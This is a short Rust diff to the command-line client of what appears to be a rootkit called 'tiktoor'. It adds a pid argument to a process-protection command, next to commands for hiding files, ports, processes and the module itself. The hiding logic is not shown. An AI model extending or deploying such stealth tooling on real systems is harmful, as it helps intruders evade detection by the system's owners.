@@ -20,7 +20,11 @@ enum Cli {
         pid: u32,
     },
     /// Protect process
-    ProcessProtection,
+    ProcessProtection{
+        /// Process pid
+        #[structopt(short, long)]
+        pid: u32,
+    },
     /// Hide tiktoor module
     ModuleHiding,
     /// Unhide tiktoor module
@@ -35,7 +39,7 @@ fn main() {
         Cli::FileHiding => {}
         Cli::PortHiding => {}
         Cli::ProcessHiding { pid } => tiktoor_client::hide_process(pid),
-        Cli::ProcessProtection => {}
+        Cli::ProcessProtection { pid } => {tiktoor_client::protect_process(pid)},
         Cli::ModuleHiding => tiktoor_client::hide_module(),
         Cli::ModuleUnhiding => tiktoor_client::unhide_module(),
     }
